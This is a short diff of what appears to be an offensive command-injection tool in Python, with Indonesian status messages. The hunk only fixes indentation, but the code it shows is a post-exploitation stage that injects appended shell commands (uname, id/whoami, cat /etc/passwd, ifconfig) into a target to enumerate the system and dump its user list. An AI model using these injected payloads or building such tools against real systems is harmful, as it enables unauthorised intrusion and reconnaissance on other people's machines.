@@ -92,15 +92,15 @@ def run_cmd_injection_module():
             print(f"    [-] Gagal terhubung: {e}")
 
         if success:
-    print("\n[***] MENGAKTIFKAN POST-EXPLOIT & SYSTEM ENUMERATION ENGINE [***]")
-    print("[*] Menjalankan serangkaian perintah otomatis untuk mengambil alih informasi sistem target...")
+        print("\n[***] MENGAKTIFKAN POST-EXPLOIT & SYSTEM ENUMERATION ENGINE [***]")
+        print("[*] Menjalankan serangkaian perintah otomatis untuk mengambil alih informasi sistem target...")
 
-    extraction_commands = [
-        {"cmd": "; uname -a", "desc": "Kernel & System Architecture"},
-        {"cmd": "; id && whoami", "desc": "Privilege & User Identity"},
-        {"cmd": "; cat /etc/passwd", "desc": "System Users Dump"},
-        {"cmd": "; ifconfig || ip a", "desc": "Network Configuration"}
-    ]
+        extraction_commands = [
+            {"cmd": "; uname -a", "desc": "Kernel & System Architecture"},
+            {"cmd": "; id && whoami", "desc": "Privilege & User Identity"},
+            {"cmd": "; cat /etc/passwd", "desc": "System Users Dump"},
+            {"cmd": "; ifconfig || ip a", "desc": "Network Configuration"}
+        ]
 
     # 1. AUTO POST-EXPLOITATION (Tetap dijalankan di awal)
     for ex in extraction_commands:
